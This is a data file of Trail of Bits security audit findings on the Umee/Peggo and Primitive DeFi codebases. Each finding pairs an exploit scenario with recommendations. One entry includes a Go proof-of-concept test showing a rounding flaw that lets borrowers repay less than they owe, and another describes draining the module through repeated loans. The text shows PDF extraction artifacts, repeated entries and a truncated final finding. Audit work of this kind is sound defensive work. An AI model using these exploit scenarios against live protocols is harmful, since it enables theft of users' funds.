        "description": "An accounts debt is considered bad debt only if its collateral balance drops to zero. The debt is then repaid from the modules reserves. However, users may liquidate the majority of an accounts assets but leave a small amount of debt unpaid. In that case, the transaction fees may make liquidation of the remaining collateral unprotable. As a result, the bad debt will not be paid from the module's reserves and will linger in the system indenitely. Exploit Scenario A large loan taken out by a user becomes highly undercollateralized. An attacker liquidates most of the users collateral to repay the loan but leaves a very small amount of the collateral unliquidated. As a result, the loan is not considered bad debt and is not paid from the reserves. The rest of the tokens borrowed by the user remain out of circulation, preventing other users from withdrawing their funds. Recommendations Short term, establish a lower limit on the amount of collateral that must be liquidated in one transaction to prevent accounts from holding dust collateral. Long term, establish a lower limit on the number of tokens to be used in every system operation. That way, even if the systems economic incentives are lacking, the operations will not result in dust tokens.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "23. Users can borrow assets that they are actively using as collateral ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "When a user calls the BorrowAsset function to take out a loan, the function does not check whether the user is borrowing the same type of asset as the collateral he or she supplied. In other words, a user can borrow tokens from the collateral that the user supplied. The Umee system prohibits users from borrowing assets worth more than the collateral they have provided, so a user cannot directly exploit this issue to borrow more funds than the user should be able to borrow. However, a user can borrow the vast majority of his or her collateral to continue accumulating lending rewards while largely avoiding the risks of providing collateral. Exploit Scenario An attacker provides 10 ATOMs to the protocol as collateral and then immediately borrows 9 ATOMs. He continues to earn lending rewards on his collateral but retains the use of most of the collateral. The attacker, through ash loans, could also resupply the borrowed amount as collateral and then immediately take out another loan, repeating the process until the amount he had borrowed asymptotically approached the amount of liquidity he had provided. Recommendations Short term, determine whether borrowers ability to borrow their own collateral is an issue. (Note that Compounds front end disallows such operations, but its actual contracts do not.) If it is, have BorrowAsset check whether a user is attempting to borrow the same asset that he or she staked as collateral and block the operation if so. Alternatively, ensure that borrow fees are greater than prots from lending. Long term, assess whether the liquidity-mining incentives accomplish their intended purpose, and ensure that the lending incentives and borrowing costs work well together.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "24. Providing additional collateral may be detrimental to borrowers in default ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "When a user who is in default on a loan deposits additional collateral, the collateral will be immediately liquidable. This may be surprising to users and may aect their satisfaction with the system. Exploit Scenario A user funds a loan and plans to use the coins he deposited as the collateral on a new loan. However, the user does not realize that he defaulted on a previous loan. As a result, bots instantly liquidate the new collateral he provided. Recommendations Short term, if a user is in default on a loan, consider blocking the user from calling the LendAsset or SetCollateralSetting function with an amount of collateral insucient to collateralize the defaulted position . Alternatively, document the risks associated with calling these functions when a user has defaulted on a loan. Long term, ensure that users cannot incur unexpected nancial damage, or document the nancial risks that users face.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "25. Insecure storage of price-feeder keyring passwords ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "Users can store oracle keyring passwords in the price-feeder conguration le. However, the price-feeder stores these passwords in plaintext and does not provide a warning if the conguration le has overly broad permissions (like those shown in gure 25.1). Additionally, neither the price-feeder README nor the relevant documentation string instructs users to provide keyring passwords via standard input (gure 25.2), which is a safer approach. Moreover, neither source provides information on dierent keyring back ends, and the example price-feeder conguration uses the \"test\" back end . An attacker with access to the conguration le on a users system, or to a backup of the conguration le, could steal the users keyring information and hijack the price-feeder oracle instance. $ ls -la ./price-feeder/price-feeder.example.toml -rwx rwxrwx 1 dc dc 848 Feb 6 10:37 ./price-feeder/price-feeder.example.toml $ grep pass ./price-feeder/price-feeder.example.toml pass = \"exampleKeyringPassword\" $ ~/go/bin/price-feeder ./price-feeder/price-feeder.example.toml 10:42AM INF starting price-feeder oracle... 10:42AM ERR oracle tick failed error=\"key with addressA4F324A31DECC0172A83E57A3625AF4B89A91F1Fnot found: key not found\" module=oracle 10:42AM INF starting price-feeder server... listen_addr=0.0.0.0:7171 Figure 25.1: The price-feeder does not warn the user if the conguration le used to store the keyring password in plaintext has overly broad permissions. // CreateClientContext creates an SDK client Context instance used for transaction // generation, signing and broadcasting. func (oc OracleClient) CreateClientContext() (client.Context, error ) { var keyringInput io.Reader if len (oc.KeyringPass) > 0 { keyringInput = newPassReader(oc.KeyringPass) } else { keyringInput = os.Stdin } Figure 25.2: The price-feeder supports the use of standard input to provide keyring passwords. ( umee/price-feeder/oracle/client/client.go#L184-L192 ) Exploit Scenario A user sets up a price-feeder oracle and stores the keyring password in the price-feeder conguration le, which has been miscongured with overly broad permissions. An attacker gains access to another user account on the user's machine and is able to read the price-feeder oracle's keyring password. The attacker uses that password to access the keyring data and can then control the user's oracle account. Recommendations Short term, take the following steps:     Recommend that users provide keyring passwords via standard input. Check the permissions of the conguration le. If the permissions are too broad, provide an error warning the user of the issue, as openssh does when it nds that a private key le has overly broad permissions. Document the risks associated with storing a keyring password in the conguration le. Improve the price-feeder s keyring-related documentation. Include a link to the Cosmos SDK keyring documentation so that users can learn about dierent keyring back ends and the addition of keyring entries, among other concepts. 26. Insu\u0000cient validation of genesis parameters Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-UMEE-26 Target: Genesis parameters",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "27. Potential overows in Peggo's current block calculations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "In a few code paths, Peggo calculates the number of a delayed block by subtracting a delay value from the latest block number. This subtraction will result in an overow and cause Peggo to operate incorrectly if it is run against a blockchain node whose latest block number is less than the delay value. We set the severity of this nding to informational because the issue is unlikely to occur in practice; moreover, it is easy to have Peggo wait to perform the calculation until the latest block number is one that will not cause an overow. An overow may occur in the following methods:  gravityOrchestrator.GetLastCheckedBlock (gure 27.1)  gravityOrchestrator.CheckForEvents  gravityOrchestrator.EthOracleMainLoop  gravityRelayer.FindLatestValset // add delay to ensure minimum confirmations are received and block is finalized currentBlock := latestHeader.Number.Uint64() - ethBlockConfirmationDelay Figure 27.1: peggo/orchestrator/oracle_resync.go#L35-L42 Recommendations Short term, have Peggo wait to calculate the current block number until the blockchain for which Peggo was congured reaches a block number that will not cause an overow.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "28. Peggo does not validate Ethereum address formats ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "In several code paths in the Peggo codebase, the go-ethereum HexToAddress function (gure 28.1) is used to parse Ethereum addresses. This function does not return an error when the format of the address passed to it is incorrect. The HexToAddress function is used in tests as well as in the following parts of the codebase:  peggo/cmd/peggo/bridge.go#L143 (in the peggo deploy-gravity command, to parse addresses fetched from gravityQueryClient )  peggo/cmd/peggo/bridge.go#L403 (in parsing of the peggo send-to-cosmos command's token-address argument)  peggo/cmd/peggo/orchestrator.go#L150 (in the peggo orchestrator [gravity-addr] command)  peggo/cmd/peggo/bridge.go#L536 and twice in #L545-L555  peggo/cmd/peggo/keys.go#L199 , #L274 , and #L299  peggo/orchestrator/ethereum/gravity/message_signatures.go#L36 , #L40 , #L102 , and #L117  p eggo/orchestrator/ethereum/gravity/submit_batch.go#L53 , #L72 , #L94 , #L136 , and #L144  peggo/orchestrator/ethereum/gravity/valset_update.go#L37 , #L55 , and #L87  peggo/orchestrator/main_loops.go#L307  peggo/orchestrator/relayer/batch_relaying.go#L81-L82 , #L237 , and #L250 We set the severity of this nding to undetermined because time constraints prevented us from verifying the impact of the issue. However, without additional validation of the addresses fetched from external sources, Peggo may operate on an incorrect Ethereum address. // HexToAddress returns Address with byte values of s. // If s is larger than len(h), s will be cropped from the left. func HexToAddress( s string ) Address { return BytesToAddress( FromHex(s) ) } // FromHex returns the bytes represented by the hexadecimal string s. // s may be prefixed with \"0x\". func FromHex(s string ) [] byte { if has0xPrefix(s) { s = s[ 2 :] } if len (s)% 2 == 1 { s = \"0\" + s } return Hex2Bytes(s) } // Hex2Bytes returns the bytes represented by the hexadecimal string str. func Hex2Bytes(str string ) [] byte { h, _ := hex.DecodeString(str) return h } Figure 28.1: The HexToAddress function, which calls the BytesToAddress , FromHex , and Hex2Bytes functions, ignores any errors that occur during hex-decoding. Recommendations Short term, review the code paths that use the HexToAddress function, and use a function like ValidateEthAddress to validate Ethereum address string formats before calls to HexToAddress . Long term, add tests to ensure that all code paths that use the HexToAddress function properly validate Ethereum address strings before parsing them.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "29. Peggo takes an Ethereum private key as a command-line argument ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "Certain Peggo commands take an Ethereum private key ( --eth-pk ) as a command-line argument. If an attacker gained access to a user account on a system running Peggo, the attacker would also gain access to any Ethereum private key passed through the command line. The attacker could then use the key to steal funds from the Ethereum account. $ peggo orchestrator {gravityAddress} \\ --eth-pk= $ETH_PK \\ --eth-rpc= $ETH_RPC \\ --relay-batches= true \\ --relay-valsets= true \\ --cosmos-chain-id=... \\ --cosmos-grpc= \"tcp://...\" \\ --tendermint-rpc= \"http://...\" \\ --cosmos-keyring=... \\ --cosmos-keyring-dir=... \\ --cosmos-from=... Figure 29.1: An example of a Peggo command line In Linux, all users can inspect other users commands and their arguments. A user can enable the proc lesystem's hidepid=2 gid=0 mount options to hide metadata about spawned processes from users who are not members of the specied group. However, in many Linux distributions, those options are not enabled by default. Exploit Scenario An attacker gains access to an unprivileged user account on a system running the Peggo orchestrator. The attacker then uses a tool such as pspy to inspect processes run on the system. When a user or script launches the Peggo orchestrator, the attacker steals the Ethereum private key passed to the orchestrator. Recommendations Short term, avoid using a command-line argument to pass an Ethereum private key to the Peggo program. Instead, fetch the private key from the keyring.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "30. Peggo allows the use of non-local unencrypted URL schemes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The peggo orchestrator command takes --tendermint-rpc and --cosmos-grpc ags specifying Tendermint and Cosmos remote procedure call (RPC) URLs. If an unencrypted non-local URL scheme (such as http://<some-external-ip>/) is passed to one of those ags, Peggo will not reject it or issue a warning to the user. As a result, an attacker connected to the same local network as the system running Peggo could launch a man-in-the-middle attack, intercepting and modifying the network trac of the device. $ peggo orchestrator {gravityAddress} \\ --eth-pk= $ETH_PK \\ --eth-rpc= $ETH_RPC \\ --relay-batches= true \\ --relay-valsets= true \\ --cosmos-chain-id=... \\ --cosmos-grpc= \"tcp://...\" \\ --tendermint-rpc= \"http://...\" \\ --cosmos-keyring=... \\ --cosmos-keyring-dir=... \\ --cosmos-from=... Figure 30.1: The problematic ags Exploit Scenario A user sets up Peggo with an external Tendermint RPC address and an unencrypted URL scheme (http://). An attacker on the same network performs a man-in-the-middle attack, modifying the values sent to the Peggo orchestrator to his advantage. Recommendations Short term, warn users that they risk a man-in-the-middle attack if they set the RPC endpoint addresses to external hosts that use unencrypted schemes such as http://.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "31. Lack of prioritization of Peggo orchestrator messages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "Peggo orchestrator messages, like oracle messages ( TOB-UMEE-20 ), are not prioritized over other transactions for inclusion in a block. As a result, if the network is highly congested, orchestrator transactions may not be included in the earliest possible block. Although the Umee system could increase the fee charged for including a Peggo orchestrator message in a block, that solution is suboptimal and may not work. Tactics for prioritizing important transactions include the following:    Using the custom CheckTx implementation introduced in Tendermint version 0.35 , which returns a priority argument Reimplementing part of the Tendermint engine , as Terra Money did Using Substrates dispatch classes , which allow developers to mark transactions as normal , operational , or mandatory Exploit Scenario A user sends tokens from Ethereum to Umee by calling Gravity Bridges sendToCosmos function. When validators notice the transaction in the Ethereum logs, they send MsgSendToCosmosClaim messages to Umee. However, 34% of the messages are front-run by an attacker, eectively stopping Umee from acknowledging the token transfer. Recommendations Short term, use a custom CheckTx method to prioritize Peggo orchestrator messages. Long term, ensure that operations that aect the whole system cannot be front-run or delayed by attackers or blocked by network congestion. 32. Failure of a single broadcast Ethereum transaction causes a batch-wide failure Severity: Undetermined Diculty: High Type: Conguration Finding ID: TOB-UMEE-32 Target: Peggo orchestrator",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "33. Peggo orchestrators IsBatchProtable function uses only one price oracle ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The Peggo orchestrator relays batches of Ethereum transactions only when doing so will be protable (gure 33.1). To determine an operations protability, it uses the price of ETH in USD, which is fetched from a single sourcethe CoinGecko API. This creates a single point of failure, as a hacker with control of the API could eectively choose which batches Peggo would relay by manipulating the price. The IsBatchProfitable function (gure 33.2) fetches the ETH/USD price; the gravityRelayer.priceFeeder eld it uses is set earlier in the getOrchestratorCmd function (gure 33.3). func (s *gravityRelayer) RelayBatches( /* (...) */ ) error { // (...) for tokenContract, batches := range possibleBatches { // (...) // Now we iterate through batches per token type. for _, batch := range batches { // (...) // If the batch is not profitable, move on to the next one. if !s.IsBatchProfitable(ctx, batch.Batch, estimatedGasCost, gasPrice, s.profitMultiplier) { continue } // (...) Figure 33.1: peggo/orchestrator/relayer/batch_relaying.go#L173-L176 func (s *gravityRelayer) IsBatchProfitable( / * (...) */ ) bool { // (...) // First we get the cost of the transaction in USD usdEthPrice, err := s.priceFeeder.QueryETHUSDPrice() Figure 33.2: peggo/orchestrator/relayer/batch_relaying.go#L211-L223 func getOrchestratorCmd() *cobra.Command { cmd := &cobra.Command{ Use: \"orchestrator [gravity-addr]\" , Args: cobra.ExactArgs( 1 ), Short: \"Starts the orchestrator\" , RunE: func (cmd *cobra.Command, args [] string ) error { // (...) coingeckoAPI := konfig.String(flagCoinGeckoAPI) coingeckoFeed := coingecko.NewCoingeckoPriceFeed( /* (...) */ ) // (...) relayer := relayer.NewGravityRelayer( /* (...) */ , relayer.SetPriceFeeder(coingeckoFeed), ) Figure 33.3: peggo/cmd/peggo/orchestrator.go#L162-L188 Exploit Scenario All Peggo orchestrator instances depend on the CoinGecko API. An attacker hacks the CoinGecko API and falsies the ETH/USD prices provided to the Peggo relayers, causing them to relay unprotable batches. Recommendations Short term, address the Peggo orchestrators reliance on a single ETH/USD price feed. Consider using the price-feeder tool to fetch pricing information or reading prices from the Umee blockchain. Long term, implement protections against extreme ETH/USD price changes; if the ETH/USD price changes by too large a margin, have the system stop fetching prices and require an operator to investigate whether the issue was caused by malicious behavior. Additionally, implement tests to check the orchestrators handling of random and extreme changes in the prices reported by the price feed. References  Check Coingecko prices separately from BatchRequesterLoop (GitHub issue)",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "34. Rounding errors may cause the module to incur losses ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The amount that a user has borrowed is calculated using AdjustedBorrow data and an InterestScalar value. Because the system uses xed-precision decimal numbers that are truncated to integer values, there may be small rounding errors in the computation of those amounts. If an error occurs, it will benet the user, whose repayment will be slightly lower than the amount the user borrowed. Figure 34.1 shows a test case demonstrating this vulnerability. It should be added to the umee/x/leverage/keeper/keeper_test.go le. Appendix G discusses general rounding recommendations. // Test rounding error bug - users can repay less than have borrowed // It should pass func (s *IntegrationTestSuite) TestTruncationBug() { lenderAddr, _ := s.initBorrowScenario() app, ctx := s.app, s.ctx // set some interesting interest scalar _ = s.app.LeverageKeeper.SetInterestScalar(s.ctx, umeeapp.BondDenom, sdk.MustNewDecFromStr( \"2.9\" )) // save initial balances initialSupply := s.app.BankKeeper.GetSupply(s.ctx, umeeapp.BondDenom) s.Require().Equal(initialSupply.Amount.Int64(), int64 ( 10000000000 )) initialModuleBalance := s.app.LeverageKeeper.ModuleBalance(s.ctx, umeeapp.BondDenom) // lender borrows 20 umee err := s.app.LeverageKeeper.BorrowAsset(ctx, lenderAddr, sdk.NewInt64Coin(umeeapp.BondDenom, 20000000 )) s.Require().NoError(err) // lender repays in a few transactions iters := int64 ( 99 ) payOneIter := int64 ( 2000 ) amountDelta := int64 ( 99 ) // borrowed expects to \"earn\" this amount for i := int64 ( 0 ); i < iters; i++ { repaid, err := s.app.LeverageKeeper.RepayAsset(ctx, lenderAddr, sdk.NewInt64Coin(umeeapp.BondDenom, payOneIter)) s.Require().NoError(err) s.Require().Equal(sdk.NewInt(payOneIter), repaid) } // lender repays remaining debt - less than he borrowed // we send 90000000, because it will be truncated to the actually owned amount repaid, err := s.app.LeverageKeeper.RepayAsset(ctx, lenderAddr, sdk.NewInt64Coin(umeeapp.BondDenom, 90000000 )) s.Require().NoError(err) s.Require().Equal(repaid.Int64(), 20000000 -(iters*payOneIter)-amountDelta) // verify lender's new loan amount in the correct denom (zero) loanBalance := s.app.LeverageKeeper.GetBorrow(ctx, lenderAddr, umeeapp.BondDenom) s.Require().Equal(loanBalance, sdk.NewInt64Coin(umeeapp.BondDenom, 0 )) // we expect total supply to not change finalSupply := s.app.BankKeeper.GetSupply(s.ctx, umeeapp.BondDenom) s.Require().Equal(initialSupply, finalSupply) // verify lender's new umee balance // should be 10 - 1k from initial + 20 from loan - 20 repaid = 9000 umee // it is more -> borrower benefits tokenBalance := app.BankKeeper.GetBalance(ctx, lenderAddr, umeeapp.BondDenom) s.Require().Equal(tokenBalance, sdk.NewInt64Coin(umeeapp.BondDenom, 9000000000 +amountDelta)) // in test, we didn't pay interest, so module balance should not have changed // but it did because of rounding moduleBalance := s.app.LeverageKeeper.ModuleBalance(s.ctx, umeeapp.BondDenom) s.Require().NotEqual(moduleBalance, initialModuleBalance) s.Require().Equal(moduleBalance.Int64(), int64 ( 1000000000 -amountDelta)) } Figure 34.1: A test case demonstrating the rounding bug Exploit Scenario An attacker identies a high-value coin. He takes out a loan and repays it in a single transaction and then repeats the process again and again. By using a single transaction for both operations, he evades the borrowing fee (i.e., the interest scalar is not increased). Because of rounding errors in the systems calculations, he turns a prot by repaying less than he borrowed each time. His prots exceed the transaction fees, and he continues his attack until he has completely drained the module of its funds. Exploit Scenario 2 The Umee system has numerous users. Each user executes many transactions, so the system must perform many calculations. Each calculation with a rounding error causes it to lose a small amount of tokens, but eventually, the small losses add up and leave the system without the essential funds. Recommendations Short term, always use the rounding direction that will benet the module rather than the user. Long term, to ensure that users pay the necessary fees, consider prohibiting them from borrowing and repaying a loan in the same block. Additionally, use fuzz testing to ensure that it is not possible for users to secure free tokens. References  How to Become a Millionaire, 0.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "35. Outdated and vulnerable dependencies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "Both Umee and Peggo rely on outdated and vulnerable dependencies. The table below lists the problematic packages used by Umee dependencies; the yellow rows indicate packages that were also detected in Peggo dependencies. We set the severity of this nding to undetermined because we could not conrm whether these vulnerabilities aect Umee or Peggo. However, they likely do not, since most of the CVEs are related to binaries or components that are not run in the Umee or Peggo code. Package Vulnerabilities golang/github.com/coreos/etc d@3.3.13 pkg:golang/github.com/dgrija lva/jwt-go@3.2.0 CVE-2020-15114 CVE-2020-15136 CVE-2020-15115 CVE-2020-26160 golang/github.com/microcosm- cc/bluemonday@1.0.4 #111 (CWE-79) golang/k8s.io/kubernetes@1.1 3.0 CVE-2020-8558, CVE-2019-11248, CVE-2019-11247, CVE-2019-11243, CVE-2021-25741, CVE-2019-9946, CVE-2020-8552, CVE-2019-11253, CVE-2020-8559, CVE-2021-25735, CVE-2019-11250, CVE-2019-11254, CVE-2019-11249, CVE-2019-11246, CVE-2019-1002100, CVE-2020-8555, CWE-601, CVE-2019-11251, CVE-2019-1002101, CVE-2020-8563, CVE-2020-8557, CVE-2019-11244 Recommendations Short term, update the outdated and vulnerable dependencies. Even if they do not currently aect Umee or Peggo, a change in the way they are used could introduce a bug. Long term, integrate a dependency-checking tool such as nancy into the CI/CD pipeline. Frequently update any direct dependencies, and ensure that any indirect dependencies in upstream libraries remain up to date. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "25. Insecure storage of price-feeder keyring passwords ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "Users can store oracle keyring passwords in the price-feeder conguration le. However, the price-feeder stores these passwords in plaintext and does not provide a warning if the conguration le has overly broad permissions (like those shown in gure 25.1). Additionally, neither the price-feeder README nor the relevant documentation string instructs users to provide keyring passwords via standard input (gure 25.2), which is a safer approach. Moreover, neither source provides information on dierent keyring back ends, and the example price-feeder conguration uses the \"test\" back end . An attacker with access to the conguration le on a users system, or to a backup of the conguration le, could steal the users keyring information and hijack the price-feeder oracle instance. $ ls -la ./price-feeder/price-feeder.example.toml -rwx rwxrwx 1 dc dc 848 Feb 6 10:37 ./price-feeder/price-feeder.example.toml $ grep pass ./price-feeder/price-feeder.example.toml pass = \"exampleKeyringPassword\" $ ~/go/bin/price-feeder ./price-feeder/price-feeder.example.toml 10:42AM INF starting price-feeder oracle... 10:42AM ERR oracle tick failed error=\"key with addressA4F324A31DECC0172A83E57A3625AF4B89A91F1Fnot found: key not found\" module=oracle 10:42AM INF starting price-feeder server... listen_addr=0.0.0.0:7171 Figure 25.1: The price-feeder does not warn the user if the conguration le used to store the keyring password in plaintext has overly broad permissions. // CreateClientContext creates an SDK client Context instance used for transaction // generation, signing and broadcasting. func (oc OracleClient) CreateClientContext() (client.Context, error ) { var keyringInput io.Reader if len (oc.KeyringPass) > 0 { keyringInput = newPassReader(oc.KeyringPass) } else { keyringInput = os.Stdin } Figure 25.2: The price-feeder supports the use of standard input to provide keyring passwords. ( umee/price-feeder/oracle/client/client.go#L184-L192 ) Exploit Scenario A user sets up a price-feeder oracle and stores the keyring password in the price-feeder conguration le, which has been miscongured with overly broad permissions. An attacker gains access to another user account on the user's machine and is able to read the price-feeder oracle's keyring password. The attacker uses that password to access the keyring data and can then control the user's oracle account. Recommendations Short term, take the following steps:     Recommend that users provide keyring passwords via standard input. Check the permissions of the conguration le. If the permissions are too broad, provide an error warning the user of the issue, as openssh does when it nds that a private key le has overly broad permissions. Document the risks associated with storing a keyring password in the conguration le. Improve the price-feeder s keyring-related documentation. Include a link to the Cosmos SDK keyring documentation so that users can learn about dierent keyring back ends and the addition of keyring entries, among other concepts.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "26. Insu\u0000cient validation of genesis parameters ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "A few system parameters must be set correctly for the system to function properly. The system checks the parameter input against minimum and maximum values (not always correctly) but does not check the correctness of the parameters dependencies. Exploit Scenario When preparing a protocol upgrade, the Umee team accidentally introduces an invalid value into the conguration le. As a result, the upgrade is deployed with an invalid or unexpected parameter. Recommendations Short term, implement proper validation of congurable values to ensure that the following expected invariants hold:  BaseBorrowRate <= KinkBorrowRate <= MaxBorrowRate  LiquidationIncentive <= some maximum  CompleteLiquidationThreshold > 0 (The third invariant is meant to prevent division by zero in the Interpolate method.)",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "31. Lack of prioritization of Peggo orchestrator messages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "Peggo orchestrator messages, like oracle messages ( TOB-UMEE-20 ), are not prioritized over other transactions for inclusion in a block. As a result, if the network is highly congested, orchestrator transactions may not be included in the earliest possible block. Although the Umee system could increase the fee charged for including a Peggo orchestrator message in a block, that solution is suboptimal and may not work. Tactics for prioritizing important transactions include the following:    Using the custom CheckTx implementation introduced in Tendermint version 0.35 , which returns a priority argument Reimplementing part of the Tendermint engine , as Terra Money did Using Substrates dispatch classes , which allow developers to mark transactions as normal , operational , or mandatory Exploit Scenario A user sends tokens from Ethereum to Umee by calling Gravity Bridges sendToCosmos function. When validators notice the transaction in the Ethereum logs, they send MsgSendToCosmosClaim messages to Umee. However, 34% of the messages are front-run by an attacker, eectively stopping Umee from acknowledging the token transfer. Recommendations Short term, use a custom CheckTx method to prioritize Peggo orchestrator messages. Long term, ensure that operations that aect the whole system cannot be front-run or delayed by attackers or blocked by network congestion.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "32. Failure of a single broadcast Ethereum transaction causes a batch-wide failure ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "description": "The Peggo orchestrator broadcasts Ethereum events as Cosmos messages and sends them in batches of 10 ( at least by default ). According to a code comment (gure 32.1), if the execution of a single message fails on the Umee side, all of the other messages in the batch will also be ignored. We set the severity of this nding to undetermined because it is unclear whether it is exploitable. // runTx processes a transaction within a given execution mode, encoded transaction // bytes, and the decoded transaction itself. All state transitions occur through // a cached Context depending on the mode provided. State only gets persisted // if all messages get executed successfully and the execution mode is DeliverTx. // Note, gas execution info is always returned. A reference to a Result is // returned if the tx does not run out of gas and if all the messages are valid // and execute successfully. An error is returned otherwise. func (app *BaseApp) runTx(mode runTxMode, txBytes [] byte , tx sdk.Tx) (gInfo sdk.GasInfo, result *sdk.Result, err error ) { Figure 32.1: cosmos-sdk/v0.45.1/baseapp/baseapp.go#L568-L575 Recommendations Short term, review the practice of ignoring an entire batch of Peggo-broadcast Ethereum events when the execution of one of them fails on the Umee side, and ensure that it does not create a denial-of-service risk. Alternatively, change the system such that it can identify any messages that will fail and exclude them from the batch. Long term, generate random messages corresponding to Ethereum events and use them in testing to check the systems handling of failed messages.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Transfer operations may silently fail due to the lack of contract existence checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "description": "The pool fails to check that a contract exists before performing transfers. As a result, the pool may assume that failed transactions involving destroyed tokens or tokens that have not yet been deployed were successful. Transfers.safeTransfer , TransferHelper.safeTransfer , and TransferHelper.safeTransferFrom use low-level calls to perform transfers without conrming the contracts existence: ) internal { ( bool success , bytes memory returnData) = address (token).call( abi.encodeWithSelector(token.transfer.selector, to, value) ); require (success && (returnData.length == 0 || abi.decode(returnData, ( bool ))), \"Transfer fail\" ); } Figure 1.1: rmm-core/contracts/libraries/Transfers.sol#16-21 The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their rst return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 1.2: The Solidity documentation details the necessity of executing existence checks before performing low-level calls. Therefore, if the tokens to be transferred have not yet been deployed or have been destroyed, safeTransfer and safeTransferFrom will return success even though the transfer was not executed. Exploit Scenario The pool contains two tokens: A and B. The A token has a bug, and the contract is destroyed. Bob is not aware of the issue and swaps 1,000 B tokens for A tokens. Bob successfully transfers 1,000 B tokens to the pool but does not receive any A tokens in return. As a result, Bob loses 1,000 B tokens. Recommendations Short term, implement a contract existence check before the low-level calls in Transfer.safeTransfer , TransferHelper.safeTransfer , and TransferHelper.safeTransferFrom . This will ensure that a swap will revert if the token to be bought no longer exists, preventing the pool from accepting the token to be sold without returning any tokens in exchange. Long term, avoid implementing low-level calls. If such calls are unavoidable, carefully review the Solidity documentation , particularly the Warnings section, before implementing them to ensure that they are implemented correctly.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "description": "Although dependency scans did not indicate a direct threat to the project under review, yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details these issues. CVE ID",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Anyone could steal pool tokens earned interest ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "description": "If a PrimitiveEngine contract is deployed with certain ERC20 tokens, unexpected token interest behavior could allow token interest to count toward the number of tokens required for the deposit , allocate , create , and swap functions, allowing the user to avoid paying in full. Liquidity providers use the deposit function to increase the liquidity in a position. The following code within the function veries that the pool has received at least the minimum number of tokens required by the protocol: if (delRisky != 0 ) balRisky = balanceRisky(); if (delStable != 0 ) balStable = balanceStable(); IPrimitiveDepositCallback( msg.sender ).depositCallback(delRisky, delStable, data); // agnostic payment if (delRisky != 0 ) checkRiskyBalance(balRisky + delRisky); if (delStable != 0 ) checkStableBalance(balStable + delStable); emit Deposit( msg.sender , recipient, delRisky, delStable); Figure 3.1: rmm-core/contracts/PrimitiveEngine.sol#213-217 Assume that both delRisky and delStable are positive. First, the code fetches the current balances of the tokens. Next, the depositCallback function is called to transfer the required number of each token to the pool contract. Finally, the code veries that each tokens balance has increased by at least the required amount. There could be a token that allows token holders to earn interest simply because they are token holders. To retrieve this interest, token holders could call a certain function to calculate the interest earned and increase their balances. An attacker could call this function from within the depositCallback function to pay out interest to the pool contract. This would increase the pools token balance, decreasing the number of tokens that the user needs to 